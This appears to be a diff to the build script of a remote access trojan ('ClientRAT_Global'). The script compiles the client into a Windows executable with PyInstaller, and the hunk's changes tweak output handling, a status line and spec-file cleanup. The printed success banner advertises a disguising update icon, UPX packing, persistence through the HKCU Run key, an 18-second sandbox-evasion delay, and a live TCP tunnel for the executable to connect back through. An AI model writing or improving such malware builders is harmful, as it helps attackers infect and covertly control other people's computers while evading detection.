@@ -145,12 +145,12 @@ def main():
     ]
     
     try:
-        subprocess.check_call(pyinstaller_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        subprocess.check_call(pyinstaller_cmd, stdout=subprocess.DEVNULL)
         print("\n[+] ========================================= [+]")
         print("   SUCCESS! Executable successfully compiled!   ")
         print(f"   Name: {exe_name}.exe                         ")
         print("   Location: ./dist/                            ")
-        print(f"   Icon: ✓ (update_icon.ico)                   ")
+        print(f"   Icon: YES (update_icon.ico)                      ")
         print(f"   UPX: {'YES' if os.path.exists(upx_path) else 'NO'} compressed                           ")
         print(f"   Persistence: YES (HKCU Run on startup)        ")
         print(f"   Delay: YES (18s sandbox evasion)              ")
@@ -160,8 +160,8 @@ def main():
     finally:
         if os.path.exists(temp_file):
             os.remove(temp_file)
-        if os.path.exists("ClientRAT_Global.spec"):
-            os.remove("ClientRAT_Global.spec")
+        if os.path.exists(f"{exe_name}.spec"):
+            os.remove(f"{exe_name}.spec")
             
     print("\n[*] The TCP tunnel is currently ACTIVE.")
     print("[*] Keep this window open! If you close it, the tunnel will stop and the .exe won't be able to connect.")
